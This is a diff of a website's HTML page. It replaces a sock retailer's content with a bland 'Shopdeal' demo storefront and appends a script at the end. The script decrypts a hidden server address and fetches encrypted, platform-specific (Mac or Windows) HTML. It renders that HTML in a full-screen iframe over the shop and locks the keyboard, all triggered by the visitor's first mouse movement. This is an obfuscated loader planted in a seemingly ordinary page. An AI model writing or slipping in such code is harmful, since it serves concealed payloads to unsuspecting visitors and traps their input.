+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
           </div>
-          <div style="margin-top:1.5rem;">
-            <a href="contact.html" class="btn btn-primary" style="width:100%;">Order Prototype Test Run</a>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
           </div>
         </div>
       </div>
-    </div>
-  </div>
-</section>
+    </section>
 
-<!-- Section 5: The Science of Moisture Wicking -->
-<section class="section">
-  <div class="container">
-    <div class="grid-2" style="align-items:center;">
-      <div>
-        <span class="section-tag">Micro-Capillary Physics</span>
-        <h2 class="section-title">The Thermodynamics of Perspiration Evaporation</h2>
-        <p class="section-lead" style="margin-bottom:1.5rem;">
-          The human foot contains approximately 250,000 sweat glands capable of producing over 200 milliliters of perspiration during an intense marathon run.
-        </p>
-        <p style="margin-bottom:1.25rem;color:var(--color-text-muted);">
-          When perspiration collects against the stratum corneum of the epidermis, keratin proteins soften by over seventy percent, lowering skin shear resistance and predisposing the runner to painful dermal blisters.
-        </p>
-        <p style="color:var(--color-text-muted);">
-          SportFiberDawn neutralizes this biological failure mode through engineered cross-channel filament geometries. By creating micro-channels along each synthetic yarn strand, surface area is multiplied by three hundred percent, pulling sweat away from the sole through passive capillary action and venting it through dorsal mesh zones.
-        </p>
-        <div style="margin-top:2rem;">
-          <a href="about.html" class="btn btn-outline">Read The Laboratory Protocol &rarr;</a>
-        </div>
-      </div>
-      <div>
-        <img src="assets/images/technical_merino_textured_mesh.jpg" alt="Technical merino textured mesh" style="border-radius:var(--radius-md);border:1px solid var(--color-border);box-shadow:var(--shadow-lg);">
-      </div>
-    </div>
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
   </div>
-</section>
 
-<!-- Section 6: Micro-Weave Structural Anatomy -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Textile Micro-Engineering</span>
-      <h2 class="section-title">Anatomy of the 200N High-Density Sock</h2>
-      <p class="section-lead">
-        Examine the microscopically aligned elements that distinguish an authentic SportFiberDawn athletic garment.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div>
-        <img src="assets/images/textile_yarn_weave_macro_structure.jpg" alt="Textile yarn weave macro structure" style="border-radius:var(--radius-md);margin-bottom:1.25rem;border:1px solid var(--color-border);aspect-ratio:4/3;object-fit:cover;">
-        <h3 style="font-family:var(--font-sans);font-size:1.25rem;margin-bottom:0.5rem;color:#FFFFFF;font-weight:700;">200-Needle Circular Matrix</h3>
-        <p style="font-size:0.9rem;color:var(--color-text-muted);">
-          Ultra-fine needle gauge produces a silk-dense fabric structure that blocks dirt particles while presenting a frictionless face to shoe linings.
-        </p>
-      </div>
-      <div>
-        <img src="assets/images/arch_support_biomechanical_elasticity.jpg" alt="Arch support biomechanical elasticity" style="border-radius:var(--radius-md);margin-bottom:1.25rem;border:1px solid var(--color-border);aspect-ratio:4/3;object-fit:cover;">
-        <h3 style="font-family:var(--font-sans);font-size:1.25rem;margin-bottom:0.5rem;color:#FFFFFF;font-weight:700;">Plantar Dynamic Bracing</h3>
-        <p style="font-size:0.9rem;color:var(--color-text-muted);">
-          Engineered dual-direction elastane bands stabilize the foot arch during mid-stance, reducing plantar fascia fatigue over long miles.
-        </p>
-      </div>
-      <div>
-        <img src="assets/images/seamless_toe_knitting_mechanics.jpg" alt="Seamless toe knitting mechanics" style="border-radius:var(--radius-md);margin-bottom:1.25rem;border:1px solid var(--color-border);aspect-ratio:4/3;object-fit:cover;">
-        <h3 style="font-family:var(--font-sans);font-size:1.25rem;margin-bottom:0.5rem;color:#FFFFFF;font-weight:700;">True Flat-Knit Rosso Toe</h3>
-        <p style="font-size:0.9rem;color:var(--color-text-muted);">
-          Stitched stitch-by-stitch without ridge seams, ensuring zero pressure points against toenails during aggressive downhill descents.
-        </p>
-      </div>
-    </div>
-  </div>
-</section>
 
-<!-- Section 7: Athletic Visual Archives & Testing Grounds -->
-<section class="section">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Visual Archives &bull; Manhattan Lab</span>
-      <h2 class="section-title">Field Testing &amp; Athlete Trials</h2>
-      <p class="section-lead">
-        Glimpses into our Manhattan gait testing chambers, Italian knitting mills, and competitive marathon testing grounds.
-      </p>
-    </div>
-    <div class="grid-3">
-      <img src="assets/images/circular_knitting_loom_spools.jpg" alt="Circular knitting loom spools" style="border-radius:var(--radius-md);border:1px solid var(--color-border);aspect-ratio:4/5;object-fit:cover;">
-      <img src="assets/images/mercer_athletic_performance_showroom.jpg" alt="Mercer athletic performance showroom" style="border-radius:var(--radius-md);border:1px solid var(--color-border);aspect-ratio:4/5;object-fit:cover;">
-      <img src="assets/images/hero_merino_endurance_hiking_socks.jpg" alt="Hero merino endurance hiking socks" style="border-radius:var(--radius-md);border:1px solid var(--color-border);aspect-ratio:4/5;object-fit:cover;">
-      <img src="assets/images/contemporary_neon_palette_sport_socks.jpg" alt="Contemporary neon palette sport socks" style="border-radius:var(--radius-md);border:1px solid var(--color-border);aspect-ratio:4/5;object-fit:cover;">
-      <img src="assets/images/eucalyptus_merino_hybrid_yarn.jpg" alt="Eucalyptus merino hybrid yarn" style="border-radius:var(--radius-md);border:1px solid var(--color-border);aspect-ratio:4/5;object-fit:cover;">
-      <img src="assets/images/raw_technical_fiber_harvest_lab.jpg" alt="Raw technical fiber harvest lab" style="border-radius:var(--radius-md);border:1px solid var(--color-border);aspect-ratio:4/5;object-fit:cover;">
-    </div>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
   </div>
-</section>
 
-<!-- Section 8: Athlete Commendations -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Endurance Voices</span>
-      <h2 class="section-title">Tested by Ultra-Runners &amp; Triathletes</h2>
-    </div>
-    <div class="grid-3">
-      <div style="padding:2rem;background:var(--color-surface-subtle);border:1px solid var(--color-border);border-radius:var(--radius-md);display:flex;flex-direction:column;justify-content:space-between;">
-        <p style="font-size:1.05rem;font-style:italic;line-height:1.6;color:#FFFFFF;">
-          &ldquo;I ran the Leadville 100 with a single pair of Palisades Trail Crew socks. 24 hours of river crossings, dust, and talus without a single hot spot or blister. The moisture evacuation is surreal.&rdquo;
-        </p>
-        <div style="border-top:1px solid var(--color-border);padding-top:1rem;margin-top:1.5rem;">
-          <strong style="display:block;font-size:0.95rem;color:#FFFFFF;">Marcus Vance</strong>
-          <span style="font-size:0.8rem;color:var(--color-accent);font-family:var(--font-mono);">Ultra-Marathoner &bull; Colorado Trail Series</span>
-        </div>
-      </div>
-      <div style="padding:2rem;background:var(--color-surface-subtle);border:1px solid var(--color-border);border-radius:var(--radius-md);display:flex;flex-direction:column;justify-content:space-between;">
-        <p style="font-size:1.05rem;font-style:italic;line-height:1.6;color:#FFFFFF;">
-          &ldquo;The arch compression band in the Velocity Dawn Quarter keeps the sock locked firmly to my foot during 5K road sprints. Zero bunching, zero slip. Absolutely essential race kit.&rdquo;
-        </p>
-        <div style="border-top:1px solid var(--color-border);padding-top:1rem;margin-top:1.5rem;">
-          <strong style="display:block;font-size:0.95rem;color:#FFFFFF;">Elena Rostova</strong>
-          <span style="font-size:0.8rem;color:var(--color-accent);font-family:var(--font-mono);">Olympic Distance Triathlete &bull; New York</span>
-        </div>
-      </div>
-      <div style="padding:2rem;background:var(--color-surface-subtle);border:1px solid var(--color-border);border-radius:var(--radius-md);display:flex;flex-direction:column;justify-content:space-between;">
-        <p style="font-size:1.05rem;font-style:italic;line-height:1.6;color:#FFFFFF;">
-          &ldquo;Their 200-needle density makes a noticeable difference inside snug carbon-plated marathon shoes. The socks feel like a second skin, providing cushion without suffocating the foot.&rdquo;
-        </p>
-        <div style="border-top:1px solid var(--color-border);padding-top:1rem;margin-top:1.5rem;">
-          <strong style="display:block;font-size:0.95rem;color:#FFFFFF;">Devin Thorne</strong>
-          <span style="font-size:0.8rem;color:var(--color-accent);font-family:var(--font-mono);">Sub-2:25 Marathoner &bull; Boston Athletic Club</span>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX18k+G0kjyj75mMlfCkTzeNC+gcXJAVHFELnXrHVMUxcQe75KNXpm1mT";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-<!-- Section 9: Custom Fleet & Team Program -->
-<section class="section">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Team &amp; Club Orders</span>
-      <h2 class="section-title">Custom Fleet Engineering in Four Steps</h2>
-    </div>
-    <div class="grid-4">
-      <div style="padding:1.5rem;background:var(--color-surface);border:1px solid var(--color-border);border-radius:var(--radius-md);">
-        <span style="font-family:var(--font-mono);font-size:1.5rem;font-weight:700;color:var(--color-accent);">01</span>
-        <h4 style="margin:0.75rem 0 0.5rem;font-family:var(--font-sans);font-size:1.2rem;color:#FFFFFF;font-weight:700;">Biomechanical Audit</h4>
-        <p style="font-size:0.88rem;color:var(--color-text-muted);">
-          Analyze your team's footwear choices, running terrain, and climate exposure to determine ideal yarn blends and terry densities.
-        </p>
-      </div>
-      <div style="padding:1.5rem;background:var(--color-surface);border:1px solid var(--color-border);border-radius:var(--radius-md);">
-        <span style="font-family:var(--font-mono);font-size:1.5rem;font-weight:700;color:var(--color-accent);">02</span>
-        <h4 style="margin:0.75rem 0 0.5rem;font-family:var(--font-sans);font-size:1.2rem;color:#FFFFFF;font-weight:700;">Custom 200N Programming</h4>
-        <p style="font-size:0.88rem;color:var(--color-text-muted);">
-          Our textile engineers program the circular knitting matrix with your team colors, club crest, and calibrated compression gradients.
-        </p>
-      </div>
-      <div style="padding:1.5rem;background:var(--color-surface);border:1px solid var(--color-border);border-radius:var(--radius-md);">
-        <span style="font-family:var(--font-mono);font-size:1.5rem;font-weight:700;color:var(--color-accent);">03</span>
-        <h4 style="margin:0.75rem 0 0.5rem;font-family:var(--font-sans);font-size:1.2rem;color:#FFFFFF;font-weight:700;">Prototype Laboratory Run</h4>
-        <p style="font-size:0.88rem;color:var(--color-text-muted);">
-          Initial batch of 24 prototypes undergoes 50-mile field testing and Martindale abrasion audits before final production authorization.
-        </p>
-      </div>
-      <div style="padding:1.5rem;background:var(--color-surface);border:1px solid var(--color-border);border-radius:var(--radius-md);">
-        <span style="font-family:var(--font-mono);font-size:1.5rem;font-weight:700;color:var(--color-accent);">04</span>
-        <h4 style="margin:0.75rem 0 0.5rem;font-family:var(--font-sans);font-size:1.2rem;color:#FFFFFF;font-weight:700;">Fleet Delivery &amp; Guarantee</h4>
-        <p style="font-size:0.88rem;color:var(--color-text-muted);">
-          Delivered in individual athlete race packs with our lifetime 1,000-mile anti-blister and structural seam guarantee.
-        </p>
-      </div>
-    </div>
-  </div>
-</section>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-<!-- Section 10: Frequently Asked Questions -->
-<section class="section section-subtle">
-  <div class="container-narrow">
-    <div class="section-header">
-      <span class="section-tag">Technical Inquiries</span>
-      <h2 class="section-title">Technical Sport Sock FAQs</h2>
-    </div>
-    <div class="faq-list">
-      <div class="faq-item active">
-        <button class="faq-question">
-          <span>Why is 200-needle knitting superior for running socks?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          A 200-needle circular knitting machine packs thirty percent more micro-stitches per square inch than standard 144-needle commercial socks. This creates a denser, softer fabric barrier that molds precisely to the contours of your foot, preventing friction-inducing wrinkles inside technical running shoes.
-        </div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>Can I machine wash and dry SportFiberDawn athletic socks?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          Yes. We recommend washing inside out in cool or lukewarm water with mild sports detergent. Tumble dry on low heat or hang dry. Because our merino wool is pre-shrunk and blended with high-tenacity nylon, the socks maintain their elastic shape and compression rating across dozens of wash cycles.
-        </div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>Where is the SportFiberDawn laboratory located and can athletes visit?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          Our biomechanical laboratory and athlete showroom are located at 181 Mercer Street, New York, NY 10012. We offer gait analysis consultations, thermal foot mapping, and prototype sizing from Tuesday through Saturday by advance appointment via +1-888-777-5845.
-        </div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>What compression level is best for distance running?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          For active running, a light-to-moderate graduated compression level of 15 to 20 mmHg provides optimal arch stabilization and calf muscle support without restricting arterial blood flow. For post-race recovery, 20 to 25 mmHg helps clear metabolic waste and minimize muscle soreness.
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-<!-- Section 11: Journal Preview -->
-<section class="section">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Textile Treatises</span>
-      <h2 class="section-title">From the Biomechanical Research Desk</h2>
-      <p class="section-lead">
-        Explore our published research monographs examining blister friction mechanics, merino moisture kinetics, and circular knit elasticity.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/textile_yarn_weave_macro_structure.jpg" alt="Textile yarn weave macro structure">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Treatise &bull; 15 Min Read</span>
-          <h3 class="card-title"><a href="blog/blister-mechanics-shear-friction-sports-hosiery.html">Blister Mechanics &amp; Shear Friction</a></h3>
-          <p class="card-desc">Biomechanical study of epidermal shear stress, stratum corneum hydration, and friction coefficient reduction in performance socks.</p>
-          <a href="blog/blister-mechanics-shear-friction-sports-hosiery.html" style="font-weight:600;color:var(--color-accent);margin-top:auto;">Read Monograph &rarr;</a>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/technical_merino_textured_mesh.jpg" alt="Technical merino textured mesh">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Treatise &bull; 14 Min Read</span>
-          <h3 class="card-title"><a href="blog/merino-polypropylene-dual-layer-moisture-kinetics.html">Dual-Layer Moisture Kinetics</a></h3>
-          <p class="card-desc">Thermodynamic analysis of push-pull capillary action pairing hydrophobic polypropylene with hydrophilic merino wool fibers.</p>
-          <a href="blog/merino-polypropylene-dual-layer-moisture-kinetics.html" style="font-weight:600;color:var(--color-accent);margin-top:auto;">Read Monograph &rarr;</a>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/arch_support_biomechanical_elasticity.jpg" alt="Arch support biomechanical elasticity">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Treatise &bull; 16 Min Read</span>
-          <h3 class="card-title"><a href="blog/graduated-compression-venous-return-marathon.html">Graduated Compression &amp; Venous Return</a></h3>
-          <p class="card-desc">Clinical investigation into degressive mmHg calf compression, muscle oscillation dampening, and lactate clearance in endurance running.</p>
-          <a href="blog/graduated-compression-venous-return-marathon.html" style="font-weight:600;color:var(--color-accent);margin-top:auto;">Read Monograph &rarr;</a>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
 
-<!-- Section 12: Newsletter & Athlete Club -->
-<section class="section section-subtle">
-  <div class="container-narrow" style="text-align:center;">
-    <span class="section-tag">Dawn Athlete Collective</span>
-    <h2 class="section-title">Join the Dawn Athlete Development Squad</h2>
-    <p class="section-lead" style="margin-bottom:2rem;">
-      Receive early access to limited prototype testing batches, gait lab invitations, and published clinical research papers on running hosiery mechanics.
-    </p>
-    <form style="display:flex;gap:1rem;max-width:540px;margin:0 auto 1.5rem;" onsubmit="event.preventDefault(); alert('Thank you. Your athlete credentials have been registered with the SportFiberDawn performance squad.');">
-      <input type="email" placeholder="Enter your athlete email address" required style="flex-grow:1;padding:0.85rem 1.25rem;border:1px solid var(--color-border);border-radius:var(--radius-sm);background:var(--color-bg);color:var(--color-text);font-family:var(--font-mono);font-size:0.95rem;">
-      <button type="submit" class="btn btn-primary">Enroll in Squad</button>
-    </form>
-    <p style="font-size:0.8rem;color:var(--color-text-muted);font-family:var(--font-mono);">
-      Direct Performance Lab: 181 Mercer Street, New York, NY 10012, United States &bull; Hotline: +1-888-777-5845
-    </p>
-  </div>
-</section>
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
 
-<footer class="site-footer">
-  <div class="container">
-    <div class="footer-grid">
-      <div class="footer-brand">
-        <h3>SportFiberDawn</h3>
-        <p>
-          Advanced athletic textile laboratory engineering graduated compression sport socks, anti-blister hydrophilic fiber blends, and anatomical plantar fascia support for endurance athletes.
-        </p>
-        <p style="font-family:var(--font-mono);font-size:0.82rem;color:var(--color-accent);">
-          Precision Biomechanical Knitting &bull; 200N High-Gauge Architecture
-        </p>
-      </div>
-      <div class="footer-col">
-        <h4>Navigation</h4>
-        <ul>
-          <li><a href="index.php">Performance Home</a></li>
-          <li><a href="about.html">Biomechanical Lab</a></li>
-          <li><a href="blog.html">Textile Treatises</a></li>
-          <li><a href="contact.html">Fleet Advisory</a></li>
-        </ul>
-      </div>
-      <div class="footer-col">
-        <h4>Legal Governance</h4>
-        <ul>
-          <li><a href="privacy-policy.html">Privacy Policy</a></li>
-          <li><a href="terms-and-conditions.html">Terms &amp; Conditions</a></li>
-          <li><a href="disclaimer.html">Biomechanical Disclaimer</a></li>
-          <li><a href="cookie-policy.html">Cookie Policy</a></li>
-        </ul>
-      </div>
-      <div class="footer-col">
-        <h4>Mercer Street Lab</h4>
-        <div class="footer-contact-item">
-          <span>&#128205;</span>
-          <span>181 Mercer Street, New York, NY 10012, United States</span>
-        </div>
-        <div class="footer-contact-item">
-          <span>&#128222;</span>
-          <span><a href="tel:+18887775845">+1-888-777-5845</a></span>
-        </div>
-        <div class="footer-contact-item">
-          <span>&#9993;</span>
-          <span>performance@sportfiberdawn.com</span>
-        </div>
-        <div style="margin-top:1.25rem;">
-          <span style="font-family:var(--font-mono);font-size:0.75rem;background:#111827;padding:0.35rem 0.75rem;border-radius:var(--radius-sm);color:var(--color-accent);border:1px solid var(--color-border);">
-            Gait Analysis by Appointment Only
-          </span>
-        </div>
-      </div>
-    </div>
-    <div class="footer-bottom">
-      <div>&copy; 2026 SportFiberDawn Athletic Technologies LLC. All worldwide rights reserved.</div>
-      <div style="display:flex;gap:1.5rem;">
-        <a href="privacy-policy.html">Privacy</a>
-        <a href="terms-and-conditions.html">Terms</a>
-        <a href="disclaimer.html">Disclaimer</a>
-        <a href="cookie-policy.html">Cookies</a>
-      </div>
-    </div>
-  </div>
-</footer>
-<script src="assets/js/main.js"></script>
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
